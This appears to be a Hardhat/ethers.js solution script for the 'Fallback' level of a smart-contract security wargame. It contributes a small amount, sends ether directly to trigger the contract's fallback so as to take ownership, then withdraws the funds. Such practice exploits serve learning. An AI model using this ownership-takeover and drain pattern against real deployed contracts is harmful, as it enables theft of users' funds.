const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x75537828f2ce51be7289709686A69CbFDbB714F1";
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Fallback",
    CONTRACT_ADDRESS,
    signer
  );
  const owner = await contract.owner();
  console.log(owner);

  // call contribute
  await contract.contribute({ value: ethers.utils.parseEther("0.0005") });
  const contribution = await contract.contributions(PLAYER_ADDRESS);
  console.log(contribution);

  // into fallback
  await signer.sendTransaction({
    to: CONTRACT_ADDRESS,
    value: ethers.utils.parseEther("0.0001"),
  });

  const newowner = await contract.owner();
  console.log(newowner);

  await contract.withdraw();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
